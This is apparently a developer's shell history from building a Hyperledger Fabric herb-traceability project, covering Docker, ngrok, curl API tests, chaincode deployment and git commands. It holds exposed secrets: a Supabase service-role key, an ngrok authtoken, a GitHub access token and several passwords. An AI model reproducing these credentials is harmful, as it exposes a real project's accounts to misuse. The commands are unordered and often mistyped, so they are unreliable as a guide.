  "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false"
curl -X POST \
  -F "image=@/home/bb/Pictures/anime.jpg" \
  "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false"
curl -X POST "https://1629380611f2.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@/home/bb/Pictures/anime.jpg"

curl -X POST "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false" \
     -F "file=@/home/bb/Pictures/Wallpapers/wallhaven-3qk76y_1920x1080.png"

curl -X POST "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@/home/bb/Pictures/Wallpapers/wallhaven-3qk76y_1920x1080.png"

curl -X POST \ -H "Content-Type: multipart/form-data" \ -F "image=@/home/bb/Pictures/Wallpapers/wallhaven-3qk76y_1920x1080.png"\ "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false"

curl -X POST \ -H "Content-Type: multipart/form-data" \ -F "image=@/home/bb/Pictures/Wallpapers/wallhaven-3qk76y_1920x1080.png"\ "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=far
mer-uploads&makePublic=false"

curl -X POST \ -H "Content-Type: multipart/form-data" \ -F "image=Pictures/Wallpapers/wallhaven-3qk76y_1920x1080.png"\ "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=far
mer-uploads&makePublic=false"

curl -X POST \
     -H "Content-Type: multipart/form-data" \
  -F "image=@/home/bb/Pictures/anime.jpg" \
  "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false"
curl -L POST "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false" \
  -F "file=@/home/bb/Pictures/anime.jpg"

curl -X POST "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false" \
  -F "file=@/home/bb/Pictures/anime.jpg"

curl -X POST "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@/home/bb/Pictures/anime.jpg"

curl -X POST \
  -F "image=@/home/bb/Pictures/anime.jpg" \
  "https://9389071c3312.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false"
ngrok http 3001
docker run --rm --env-file .env supabase-image-service node dist/scripts/init-bucket.js
cd /home/bb/sih/blockchian/Snack_Overflow/supabase-image-service
docker build -t supabase-image-service .
docker run --rm -p 3001:3001 --env-file .env supabase-image-service
cd /home/bb/sih/blockchian/Snack_Overflow/supabase-image-service
printf "%s\n" \
"PORT=3001" \
"SUPABASE_URL=https://yaikbdurhxrhstfqnzza.supabase.co" \
"SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlhaWtiZHVyaHhyaHN0ZnFuenphIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1ODE5MzExOSwiZXhwIjoyMDczNzY5MTE5fQ.p6x2JlR1TeGvcof3MwdOeagVsDPdocTKboZJZW8BmjY" \
"SUPABASE_BUCKET=herb-images" \
"PUBLIC_IMAGE_BASE_URL=" > .env
feh downloaded.jpg
curl -L "https://1629380611f2.ngrok-free.app/image?storageKey=herb-images:farmer-uploads/1758196159274-zs5op89a.jpg" -o downloaded.jpg
curl https://1629380611f2.ngrok-free.app/health
/bin/bash -lc 'cd /home/bb/sih/ml/Snack_Overflow/server-node-sdk; rm -rf wallet; node cert-script/registorCoAdmin.js | cat; ls -l wallet | cat'
cat downloaded.jpg
curl -L "https://2b7207a9c3eb.ngrok-free.app/image?storageKey=herb-images:farmer-uploads/1758196159274-zs5op89a.jpg" -o downloaded.jpg
kill   2216174
rm downloaded.jpg
curl -L "https://2b7207a9c3eb.ngrok-free.app/image?storageKey=herb-ima
ges:farmer-uploads/1758196159274-zs5op89a.jpg" -o downloaded.jpg
ngrok http 8081
cd /home/bb/sih/blockchian/Snack_Overflow/supabase-image-service
docker build -t supabase-image-service .
docker run --rm -p 8081:8081 --env-file .env supabase-image-service
cd /home/bb/sih/blockchian/Snack_Overflow/supabase-image-service
docker build -t supabase-image-service .
docker run --rm -p 8080:8080 --env-file .env supabase-image-service
node cert-script/registorCoAdmin.js
curl -sS -X POST http://localhost:5000/registerCollector \
  -H "Content-Type: application/json" \
  -d '{
    "cooperativeId": "cooperativeAdmin",
    "collectorId": "collector2001",
    "name": "Ravi Kumar",
    "city": "Nashik",
    "password": "AnotherPass!123",
    "specialization": "Organic",
    "cooperativeName": "Herb Coop One"
  }'
node cert-script/testing-files/registerOrg1Admin.js
cd ../../
cd ../test-network/
cd fabric-samples/asset-transfer-basic/chaincode-javascript/
mv asset-transfer-basic/ fabric-samples/
ls fabric-samples/
rm -rf fabric-samples/asset-transfer-basic/
cp -r fabric-samples/ ../../ml/Snack_Overflow/
sudo rm -rf fabric-samples/
rm -rf fabric-samples/
cp -r fabric-samples/asset-transfer-basic/ .
curl -sS -X POST http://localhost:5000/registerCollector \
  -H "Content-Type: application/json" \
  -d '{
    "cooperativeId": "cooperativeAdmin",
    "collectorId": "collector124",
    "name": "Ravi Kumar",
    "city": "Nashik",
    "password": "AnotherPass!123",
    "specialization": "Organic",
    "cooperativeName": "Herb Coop One"
  }'
# Ensure scripts can find fabric-samples (if not already symlinked)
cd /home/bb/sih/ml/Snack_Overflow
[ -e server-node-sdk/fabric-samples ] || ln -s ../fabric-samples server-node-sdk/fabric-samples

# Run from inside server-node-sdk so wallet writes to server-node-sdk/wallet
cd /home/bb/sih/ml/Snack_Overflow/server-node-sdk
rm -rf wallet/ 
node /home/bb/sih/ml/Snack_Overflow/server-node-sdk/cert-script/registorCoAdmin.js 
ls -l wallet/
/bin/bash -lc 'set -e; cd /home/bb/sih/ml/Snack_Overflow; echo "Stopping API/frontend..."; if [ -f server-node-sdk/api.pid ] && kill -0 $(cat server-node-sdk/api.pid) 2>/dev/null; then kill $(cat server-node-sdk/api.pid); fi; if [ -f frontend/frontend.pid ] && kill -0 $(cat frontend/frontend.pid) 2>/dev/null; then kill $(cat frontend/frontend.pid); fi; pkill -f "server-node-sdk/app.js" 2>/dev/null || true; echo "Bringing Fabric test network down..."; cd fabric-samples/test-network; ./network.sh down | cat; echo DONE'
mv ../fabric-samples/asset-transfer-basic/chaincode-javascript/lib/ehrChainCode.js   ../
bash  -lc 'cd server-node-sdk && if test -f api.pid; and kill -0 (cat api.pid) ^/dev/null; kill (cat api.pid); end; pkill -f "server-node-sdk/app.js" 2>/dev/null; nohup node app.js > api.log 2>&1 &; echo $last_pid > api.pid; sleep 2; curl -sS http://localhost:5000/status | cat; curl -sS -X POST http://localhost:5000/loginCollector -H "Content-Type: application/json" -d "{\"collectorId\":\"collector1123\",\"password\":\"StrongPass!234\"}" | cat; echo; tail -n 80 api.log | cat'
fish -lc 'cd server-node-sdk && if test -f api.pid; and kill -0 (cat api.pid) ^/dev/null; kill (cat api.pid); end; pkill -f "server-node-sdk/app.js" 2>/dev/null; nohup node app.js > api.log 2>&1 &; echo $last_pid > api.pid; sleep 2; curl -sS http://localhost:5000/status | cat; curl -sS -X POST http://localhost:5000/loginCollector -H "Content-Type: application/json" -d "{\"collectorId\":\"collector1123\",\"password\":\"StrongPass!234\"}" | cat; echo; tail -n 80 api.log | cat'
/usr/bin/fish -lc 'cd server-node-sdk && if test -f api.pid; and kill -0 (cat api.pid) ^/dev/null; kill (cat api.pid); end; pkill -f "server-node-sdk/app.js" 2>/dev/null; nohup node app.js > api.log 2>&1 &; echo $last_pid > api.pid; sleep 2; curl -sS http://localhost:5000/status | cat; curl -sS -X POST http://localhost:5000/loginCollector -H "Content-Type: application/json" -d "{\"collectorId\":\"collector1123\",\"password\":\"StrongPass!234\"}" | cat; echo; tail -n 80 api.log | cat'
curl -sS -X POST http://localhost:5000/loginCollector \
  -H "Content-Type: application/json" \
  -d '{ "collectorId": "collector123", "password": "StrongPass!234" }'
curl -sS -X POST http://localhost:5000/registerCollector \
  -H "Content-Type: application/json" \
  -d '{
    "cooperativeId": "coop1",
    "collectorId": "collector123",
    "name": "Asha Sharma",
    "city": "Pune",
    "password": "StrongPass!234",
    "specialization": "Wildcrafting",
    "cooperativeName": "Herb Coop One"
  }'
tail -n 100 /home/bb/sih/ml/Snack_Overflow/server-node-sdk/api.log
bash /home/bb/sih/ml/Snack_Overflow/HerbAbhilekh.sh
curl -s http://localhost:5000/status
curl -L "https://9389071c3312.ngrok-free.app/image?storageKey=herb-images:farmer-uploads/1758196159274-zs5op89a.jpg" -o downloaded.jpg
curl -L "https://yaikbdurhxrhstfqnzza.supabase.co/storage/v1/object/sign/herb-images/farmer-uploads/1758196159274-zs5op89a.jpg?token=...<truncated>..." -o downloaded.jpg
curl -L "https://9389071c3312.ngrok-free.app//image?storageKey=herb-images:farmer-uploads/1758196159274-zs5op89a.jpg" -o downloaded.jpg
curl -L "https://NGROK_URL/image?storageKey=herb-images:farmer-uploads/1758196159274-zs5op89a.jpg" -o downloaded.jpg
curl "https://9389071c3312.ngrok-free.app/signed-url?storageKey=herb-images:farmer-uploads/1758196159274-zs5op89a.jpg&expiresIn=600"
curl "https://https://9389071c3312.ngrok-free.app/signed-url?storageKey=herb-images:farmer-uploads/1758196159274-zs5op89a.jpg&expiresIn=600"
curl -X POST \
  -F "image=@/home/bb/Pictures/anime.jpg" \
  "https://https://9389071c3312.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false"
ngrok http 8080
docker volume prune
docker volume ls
docker kill f6b4c5c3ce08
curl -X POST \
  -F "image=@/home/bb/Pictures/plsowrk.png" \
  "https://17b2b815c925.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false"
curl -X POST \
  -F "image=@/home/bb/Pictures/plsowrk.jpg" \
  "https://17b2b815c925.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false"
ngrok http 9090
ngrok config add-authtoken 32s37HavWcmWO5J62q5lSuZPaEV_hvNoMfHzoBscjDM7h44q
# Download the Linux AMD64 version
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz

# Extract and install
tar -xzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/
sudo pacman -S ngrok
sudo pacman -Ss paru
sudo pacman -S paru
sudo pacman -S nodejs npm git
cd ../frontend/
git push origin blockchain
git commit -m "added FHIR Standard tags"
git status | grep "herb"
git commit .
DRAWEXE
flameshot gui
sudo pacman -S flameshot
sudo pacman -S spectacle
libreoffice
sudo pacman -Ss ppt
sudo pacman -Ss powerpoint
powerpoint
feh sequencechat.png
cd Pictures/
npm run start
cd frontend/new-frontent/
unzip herb-abhilekh-frontend.zip
cd new-frontent/
mv herb-abhilekh-frontend.zip  new-frontent/
unzip  herb-abhilekh-frontend.zip new-frontent/
mkdir -p new-frontent
unzip  herb-abhilekh-frontend.zip
cd blockchian/
cd ../
git ..
BASH
curl -s http://localhost:5001/registerCollector \
  -H "Content-Type: application/json" \
  -d '{
    "userId":"Cooperative01",
    "collectorData":{
      "collectorId":"collector01",
      "name":"Ravi Kumar",
      "location":{"village":"Rampur","state":"MH","country":"IN"},
      "certifications":["NMPB"],
      "cooperativeId":"Cooperative01"
    }
  }'
docker restart peer0.org1.example.com peer0.org2.example.com
export GRPC_SSL_CIPHER_SUITES=ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256
pkill -f "/server-node-sdk/app.js" || true
PORT=5001 npm start
S
openssl s_client -connect localhost:7051 -servername peer0 -CAfile /tmp/org1-peer-tlsca.pem </dev/null | grep -E "Verify return code|subject=|issuer=|SSL-Session"
# Expect: Verify return code: 0 (ok)
docker exec peer0.org1.example.com cat /etc/hyperledger/fabric/tls/ca.crt > /tmp/org1-peer-tlsca.pem
docker exec peer0.org2.example.com cat /etc/hyperledger/fabric/tls/ca.crt > /tmp/org2-peer-tlsca.pem
docker exec orderer.example.com cat /var/hyperledger/orderer/tls/ca.crt > /tmp/orderer-tlsca.pem
openssl s_client -connect localhost:7051 -servername peer0.org1.example.com -verify_return_error </dev/null | head -n 20
export GRPC_SSL_CIPHER_SUITES=ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256
export NODE_OPTIONS=--openssl-legacy-provider
pkill -f "/server-node-sdk/app.js" || true
PORT=5001 npm start
curl -s http://localhost:5001/registerIdentity \
  -H "Content-Type: application/json" \
  -d '{"enrollmentID":"Cooperative01","role":"cooperative","orgNumber":1}'
export GRPC_SSL_CIPHER_SUITES=HIGH+ECDSA
pkill -f "/server-node-sdk/app.js" || true
PORT=5001 npm start
PORT=5001 npm start
./network.sh deployCC -ccn herbTraceabilityChaincode -ccp ../../../Snack_Overflow/fabric-samples/asset-transfer-basic/chaincode-javascript -ccl javascript
./network.sh up createChannel -ca -s couchdb
cd ../../server-node-sdk/\

cd /home/bb/sih/hyperledger/SOBackup/server-node-sdk
nvim herbTraceabilityChaincode.js
cd ../fabric-samples/asset-transfer-basic/chaincode-javascript/lib/
pkill -f "/server-node-sdk/app.js" || true
cd /home/bb/sih/hyperledger/Snack_Overflow/server-node-sdk
PORT=5001 npm start
curl -vk https://localhost:7051
docker ps --format "table {{.Names}}\t{{.Ports}}" | grep -E "peer0.org1|peer0.org2|orderer"
# You should see 7051/tcp (peer0.org1), 9051/tcp (peer0.org2), 7050 (orderer)
curl -s http://localhost:5001/createCollectionEvent \
  -H "Content-Type: application/json" \
  -d '{
    "userId":"collector01",
    "eventData":{
      "herbSpecies":"Ashwagandha",
      "speciesCode":"ASHW001",
      "quantity":25,
      "unit":"kg",
      "gpsCoordinates":{"latitude":12.5,"longitude":75.2},
      "harvestMethod":"root-division",
      "weatherConditions":"clear",
      "soilConditions":"loamy",
      "plantAge":14,
      "wildcrafted":false,
      "organicCertified":false,
      "images":[]
    }
  }'
docker logs 6936b088896d
docker logs6936b088896d
curl -s http://localhost:5001/registerIdentity \
  -H "Content-Type: application/json" \
  -d '{"enrollmentID":"labCompany01","role":"lab","orgNumber":2}'
curl -s http://localhost:5001/registerIdentity \
  -H "Content-Type: application/json" \
  -d '{"enrollmentID":"manufacturer01","role":"manufacturer","orgNumber":1}'
curl -s http://localhost:5001/registerIdentity \
  -H "Content-Type: application/json" \
  -d '{"enrollmentID":"processor01","role":"processor","orgNumber":1}'
curl -s http://localhost:5001/registerIdentity \
  -H "Content-Type: application/json" \
  -d '{"enrollmentID":"collector01","role":"collector","orgNumber":1}'
docker logs bfa6d4838369
npm i
nvim package.json
nvim app.js
rm -r node_modules/
ls ..
rm app.js invoke.js query.js helper.js
cp ../../Snack_Overflow/server-node-sdk/app.js  .
cd sih/hyperledger/SOBackup/server-node-sdk/
docker logs cc83e6ac5a01
docker logs c83e6ac5a01
docker logs 267ab7d84ae6
docker logs 871cc65a4688
node cert-script/onboardInsuranceCompany.js
cd sih/hyperledger/EHR-Hyperledger-Fabric-Project/
reboot
docker logs 1a8a93d7b685
docker ps1a8a93d7b685
docker logs 3e3f15bf27a5
./network.sh deployCC -ccn ehrChainCode -ccp ../asset-transfer-basic/chaincode-javascript/ -ccl javascript
docker logs 41d0994ea23f
nvim cert-script/registorCoAdmin.js
docker logs 11ef704bc501
nvim cert-script/registerOrg2Admin.js
# List installed chaincodes
docker exec peer0.org1.example.com peer lifecycle chaincode queryinstalled

# List committed chaincodes on the channel
docker exec peer0.org1.example.com peer lifecycle chaincode querycommitted -C mychannel
./network.sh deployCC -ccn herbTraceabilityChaincode -ccp ../asset-transfer-basic/chaincode-javascript -ccl javascript
./network.sh deployCC -ccn herbTraceabilityChaincode -ccp ../asset-transfer-basic/chaincode-javascript/lib -ccl javascript
cd ../../test-network/
cp /home/bb/sih/hyperledger/Snack_Overflow/fabric-samples/asset-transfer-basic/chaincode-javascript/package.json \
   /home/bb/sih/hyperledger/SOBackup/fabric-samples/asset-transfer-basic/chaincode-javascript/package.json
cd /home/bb/sih/hyperledger/SOBackup/fabric-samples/asset-transfer-basic/chaincode-javascript
npm install
cd ../asset-transfer-basic/chaincode-javascript/
nvim index.js
./network.sh deployCC -ccn herbTraceabilityChaincode -ccp ../asset-transfer-basic/chaincode-javascript/lib/ -ccl javascript
ls -la ../../fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/connection-org1.json
cd ../fabric-samples/test-network
docker logs peer0.org1.example.com | tail -20
docker logs orderer.example.com | tail -20
sudo find .. -name "*chaincode*" -type d
sudo find .. -name "*HerbTraceability*" -type f
find .. -name "*chaincode*" -type d
find .. -name "*HerbTraceability*" -type f
curl -X POST http://localhost:5000/collectors/register \
  -H 'Content-Type: application/json' \
  -H 'x-identity: cooperativeAdmin' \
  -d '{"collectorId":"COLL1","name":"Asha","location":{"lat":10.1,"lng":76.3},"certifications":[],"cooperativeId":"Cooperative01"}'
node app.js
sudo kill -9 2492400
ls -la
pkill 2709448
pkill 2492400
pkill 2281117
ps aux | grep node
npm stop
ls -la *.js
cat package.json
curl -v -X POST http://localhost:5000/collectors/register \
  -H 'Content-Type: application/json' \
  -H 'x-identity: cooperativeAdmin' \
  -d '{"collectorId":"COLL1","name":"Asha","location":{"lat":10.1,"lng":76.3},"certifications":[],"cooperativeId":"Cooperative01"}'
ls -la wallet/
curl -X POST http://localhost:5000/collectors/register \
-H 'Content-Type: application/json' \
-H 'x-identity: cooperativeAdmin' \
-d '{"collectorId":"COLL1","name":"Asha","location":{"lat":10.1,"lng":76.3},"certifications":[],"cooperativeId":"Cooperative01"}'
node stop
curl -s http://localhost:5000/status
# should return JSON, not HTML
curl -s -X POST http://localhost:5000/collectors/register \
  -H 'Content-Type: application/json' \
  -H 'x-identity: cooperativeAdmin' \
  -d '{"collectorId":"COLL1","name":"Asha","location":{"lat":10.1,"lng":76.3},"certifications":[],"cooperativeId":"Cooperative01"}'
node cert-script/onboardCooperative01.js
node cert-script/Cooperative01.id
npm start
docker ps  | grep ca_org1
docker ps  | grep ca
cd cert-script/
# Register collector (as cooperative identity)
curl -s http://localhost:5000/collectors/register \
  -H 'Content-Type: application/json' \
  -H 'x-identity: cooperative01' \
  -d '{"collectorId":"COLL001","name":"Asha","location":{"lat":10.1,"lng":76.3},"certifications":[],"cooperativeId":"coop-uuid"}'

# Create collection event (as collector identity)
curl -s http://localhost:5000/collections \
  -H 'Content-Type: application/json' \
  -H 'x-identity: COLL001' \
  -d '{"herbSpecies":"Ashwagandha","speciesCode":"ASHW001","quantity":10,"unit":"kg","gpsCoordinates":{"latitude":10.1,"longitude":76.3},"harvestMethod":"root-division"}'

# Get provenance by QR (any enrolled identity)
curl -s 'http://localhost:5000/provenance/QR_...?...' -H 'x-identity: COLL001'
curl http://localhost:5000/status
cat test/assetTransfer.test.js
cd lib/
cat index.js
cd .
nvim ../../../EHR-Hyperledger-Fabric-Project/fabric-samples/test-network/scripts/orderer.sh
nvim scripts/orderer.sh
cd test-network/
mv ehrChainCode.js  assetTransfer.js  ../../
cd fabric-samples/asset-transfer-basic/chaincode-javascript/lib/
cp ../asset-transfer-basic/chaincode-javascript/lib/herbTraceabilityChaincode.js  ../../../SOBackup/fabric-samples/asset-transfer-basic/chaincode-javascript/lib/
cd SOBackup/
cd hyperledger/ehr-testing/
ls ../asset-transfer-basic/chaincode-javascript/lib/
ls ../asset-transfer-basic/chaincode-javascript/
nvim scripts/orderer2.sh
ls scripts/
ls compose/
cat network.sh
cat setOrgEnv.sh
docker logs  e0ce2ec2b837
docker ps e0ce2ec2b837
curl http://localhost:5000/registerCollector
./ayurtrace.sh
.cd ..
git pull origin blockchain
. ~/.nvm/nvm.sh && nvm install 18 && nvm alias default 18
sudo fuser -k 5000/tcp

lsof -i :5000

./test-clean-api.sh
./validate-backend.sh
./network.sh deployCC \
  -c mychannel \
  -ccn herbTraceabilityChaincode \
  -ccp ../asset-transfer-basic/chaincode-javascript \
  -ccl javascript
./network.sh up createChannel -c mychannel -ca
cd ../../../../server-node-sdk/
mv lib/assetTransfer.js  lib/ehrChainCode.js  ../
docker logs dev-peer0.org1.example.com-herbTraceability_1.0-c568e77146965e75980cc2ddf208e8288ce53de1856f91c27592ee3c0999d267
docker logs peer0.org2.example.com
docker logs peer0.org1.example.com
docker logs  ca_org1
docker logs  ayurvedic-api
docker logs dbcc68b74db1
docker logs 001eeed60334
docker logs001eeed60334
cd /home/bb/sih/hyperledger/Snack_Overflow
./ayurtrace.sh
sed -i 's|^PROJECT_ROOT=.*|PROJECT_ROOT="/home/bb/sih/hyperledger/Snack_Overflow"|' /home/bb/sih/hyperledger/Snack_Overflow/ayurtrace.sh
chmod +x /home/bb/sih/hyperledger/Snack_Overflow/ayurtrace.sh
cd hyperledger/Snack_Overflow/
node cert-script/registerLab.js
node cert-script/registerGov.js
nvim cert-script/registerGov.js
node cert-script/registerManufacturer.js
nvim cert-script/registerLab.js
./run_tests.sh
mkdir -p wallet
cd server-node-sdk/cert-script/
ls ../
ls lib/
mv lib/ehrChainCode.js  ../
mv lib/assetTransfer.js  ../
cd Snack_Overflow/fabric-samples/test-network/
dc ..
rm -rf testing-files/
dc server-node-sdk/
git clone git@github.com:Hemang360/ayurvedic-network.git
ks
git checkout cc079a1
git log --oneline

cd hyperledger/
sudo rm -rf Snack_Overflow/
rm -rf Snack_Overflow/
nvim test-clean-api.sh
nvim ayurtrace.sh
./run_transfer_demo.sh
curl -s -X POST http://localhost:5000/acceptHerbbatch \
  -H 'Content-Type: application/json' \
  -d '{"userId":"labAgent01","herbbatchId":"HB-1758047451"}' | jq
ls  wallet/
curl -s -X POST http://localhost:5000/acceptHerbbatch \
  -H 'Content-Type: application/json' \
  -d '{"userId":"labAgent01","herbbatchId":"HB-1758039268"}' | jq
feh qrs/id_123.png
node /home/bb/sih/hyperledger/Snack_Overflow/server-node-sdk/qr.js ID-3421423 ./qrs/id_123.png
curl -s -u admin:adminpw -H 'Content-Type: application/json' \
  -d '{"selector":{"collectorId":{"$exists":true}}}' \
  'http://localhost:5984/mychannel_ehr$chain$code/_find' | jq '.docs'
curl -s -u admin:adminpw -H 'Content-Type: application/json' \
  -d '{"selector":{"herbbatchId":"HB-1758039268"}}' \
  'http://localhost:5984/mychannel_ehr$chain$code/_find' | jq '.docs'
curl -s -u admin:adminpw -H 'Content-Type: application/json' \
  -d '{"selector":{"herbbatchId":"HB-1758039268"}}' \
  http://localhost:5984/mychannel_ehrchaincode/_find | jq '.docs'
curl -s -u admin:adminpw http://localhost:7984/_all_dbs | jq
curl -s -u admin:adminpw "http://localhost:7984/mychannel_ehrchaincode/_all_docs?include_docs=true" | jq '.rows[].doc'
curl -s -u admin:adminpw "http://localhost:5984/mychannel_ehrchaincode/_all_docs?include_docs=true" | jq '.rows[].doc'
curl -s -u admin:adminpw http://localhost:5984/_all_dbs | jq
curl -u admin:adminpw "http://127.0.0.1:5984/mychannel_ehr$chain$code/_all_docs?include_docs=true"

curl -u admin:adminpw http://127.0.0.1:5984/_all_dbs

docker logs 88f5eab2504f
docker logs 7e0de7cf17a5
docker logs 80c3c2598dca
docker logs   dev-peer0.org1.example.com-ehrchaincode_1.0-274a2a6fbae39859e8b11af5ea449615a63616afab5406a2ef653f102227d7ff-29dcce7ee4f96c93d508a32c24910965c22fd29677e865a2b935e9c1c67e3802
docker logs  hyperledger/fabric-peer:latest
chmod +x run_transfer_demo.sh
cd sih/hyperledger/Snack_Overflow/fabric-samples/test-network/
ls ../../../Snack_Overflow/server-node-sdk/wallet/
git push origin blockchain

git config pull.rebase false
git pull origin blockchain

git config pull.rebase true

ls SOBackup/
sudo cp -r Snack_Overflow/ SOBackup/
cp -r Snack_Overflow/ SOBackup/
git commit -m "registration&login works"
git add . README.md
mv README.md?token=GHSAT0AAAAAADJXDRM5WXODP7K5ILLHZT262GJN4GA  README.md
wget 'https://raw.githubusercontent.com/Hemang360/Snack_Overflow/refs/heads/blockchain/README.md?token=GHSAT0AAAAAADJXDRM5WXODP7K5ILLHZT262GJN4GA'
feh screenshot_2025-09-16-18-34-42.png
scrot ~/Pictures/screenshot_%Y-%m-%d-%H-%M-%S.png

sudo pacman -S scrot
./login.sh
chmod +x login.sh
nvim login.sh
nvim run_tests.sh
cd /home/bb/sih/hyperledger/Snack_Overflow/server-node-sdk
chmod +x run_tests.sh
rm callChaincode.js
ls testing-files/
mv cooperativeAdmin.id  fetchledger.js  getallassets.js   getusercertificaaate.js  onboardCollector.js  onboardCollectorarg.js  onboardCooperativeadmin.js  onboardDoctor.js  onboardHospital01.js  onboardInsuranceAgent.js  onboardInsuranceCompany.js  registerOrg1Admin.js  testing-files/
mkdir testing-files
# Test with your API
curl -X POST http://localhost:5000/registerCollector \
  -H "Content-Type: application/json" \
  -d '{
    "cooperativeId": "Cooperative01",
    "collectorId": "Collector-Test-001",
    "name": "Dr. Test",
    "city": "Mumbai",
    "password": "testpass123",
    "specialization": "General Medicine",
    "cooperativeName": "Test Cooperative"
  }'
rm wallet/cooperativeAdmin.id
nvim registorCoAdmin.js
curl -X POST http://localhost:5000/registerCollector \
  -H "Content-Type: application/json" \
  -d '{
    "cooperativeId": "Cooperative-Admin-01",
    "collectorId": "Dr-Patel-01",
    "name": "Dr. Sanjay Patel",
    "city": "Bengaluru",
    "password": "doctorpassword123",
    "specialization": "General Medicine",
    "cooperativeName": "HealthCoop"
  }'

sudo rm -rf /home/bb/sih/blockchian/ca-data/*

rm -rf /home/bb/sih/blockchian/ca-data/*

docker inspect c41b8b69a0b1     | grep Source
docker inspect 9d6c37048e4c    | grep Source
docker inspect ca282afbb554   | grep Source
ls ../../../../blockchian/ca-data/
ls ../../../../blockchian/certificates/
docker inspect 04938ebed1fd  | grep Source

docker ps -a

docker volume ls
# Identify CA volume for Org1 (commonly like "docker_test-network-ca_
./postman
cd Postman/Postman/app/
node cert-script/onboardCooperativeadmin.js
curl -X POST http://localhost:5000/registerCollector \
  -H "Content-Type: application/json" \
  -d '{
    "cooperativeId": "Cooperative-Admin-01",
    "collectorId": "Dr-Patel-01",
    "name": "Dr. Sanjay Patel",
    "city": "Bengaluru",
    "password": "doctorpassword123",
    "specialization": "General Medicine",
    "cooperativeName": "HealthCoop"
  }'
curl -X POST http://localhost:5000/registerCollector \
  -H "Content-Type: application/json" \
  -d '{
    "cooperativeId": "Cooperative02-v3",
    "collectorId": "Dr-Patel-01",
    "name": "Dr. Sanjay Patel",
    "city": "Bengaluru",
    "password": "doctorpassword123",
    "specialization": "General Medicine",
    "cooperativeName": "HealthCoop"
  }'
curl -X POST http://localhost:5000/registerCollector \
  -H "Content-Type: application/json" \
  -d '{
    "cooperativeId": "Cooperative01-v2",
    "collectorId": "Dr-Patel-01",
    "name": "Dr. Sanjay Patel",
    "city": "Bengaluru",
    "password": "doctorpassword123",
    "specialization": "General Medicine",
    "cooperativeName": "HealthCoop"
  }'
node cert-script/onboardCollector.js
node cert-script/onboardLabCompany.js
brightnessctl set 40%
brightnessctl set 30%
code
java Basic.java
nvim basic.java
nvim Basic.java
mv basic.java Basic.java
mv basic.java basic.java
java basic.java
cp chaincode/ayurvedic-traceability/lib/ayurvedic-contract.js ../ayurvedic-network/
git checkout Hemang
brightnessctl set 10%
mkdir clg-java
java --version
nmtui-connect  poco
git commit -m "api working"
cp -r cert-script/ ../../Snack_Overflow/server-node-sdk/
cp app.js helper.js invoke.js query.js  ../../Snack_Overflow/server-node-sdk/
rm -r cert-script/
rm onboardLabCompany.js  registerOrg1Admin.js  registerOrg2Admin.js
rm onboardHospital01.js  onboardInsuranceAgent.js  onboardInsuranceCompany.js  onboardLabAgent.js
rm callChaincode.js  onboardCollector.js onboardCollectorarg.js  onboardCooperative01.js  onboardDoctor.js
cd sih/hyperledger/ehr-testing/server-node-sdk/
cd sih/hyperledger/Snack_Overflow/
LS
rm query.js app.js invoke.js helper.js
rm  -r wallet/
rm wallet/
cp -r wallet/ ../
node onboardCooperative01.js
rm -r ../wallet/
mv  wallet/Cooperative01.id  .
node registerOrg1Admin.js
node onboardCooperativeadmin.js
curl -X POST http://localhost:5000/registerHerbbatch \
  -H "Content-Type: application/json" \
  -d '{
    "adminId": "cooperative01",
    "collectorId": "Cooperative01",
    "userId": "herbbatch-001", 
    "name": "John Doe",
    "dob": "1990-01-01",
    "city": "Mumbai"
  }'
curl -X POST http://localhost:5000/registerHerbbatch \
  -H "Content-Type: application/json" \
  -d '{
    "adminId": "cooperativeAdmin",
    "collectorId": "Cooperative01",
    "userId": "herbbatch-001", 
    "name": "John Doe",
    "dob": "1990-01-01",
    "city": "Mumbai"
  }'
mv query_js.js  query.js
mv fixed_invoke_js.js  invoke.js
mv fixed_helper_js.js  helper.js
mv fixed_app_js.js  app.js
ls ../wallet/
./Postman
cd ~/Postman/Postman/app/
mv wallet/cooperativeAdmin.id .
node getusercertificaaate.js Collector-ola
node getusercertificaaate.js cooperativeAdmin
node getusercertificaaate.js Collector-jui
node getusercertificaaate.js Collector-jui.id
node getusercertificaaate.js
brightnessctl set 20%
node fetchledger.js
node getallassets.js cooperativeAdmin
node getallassets.js Cooperative01
node getallassets.js Herbbatch-tulsi1
node getallassets.js
node onboardCollectorarg.js  tulsi
git commit -m "intial testing stage : V1.0"
sudo rm -r ehr-testing/
rm -r ehr-testing/
sudo cp -r ehr-testing/* .

cp -r ehr-testing/* .

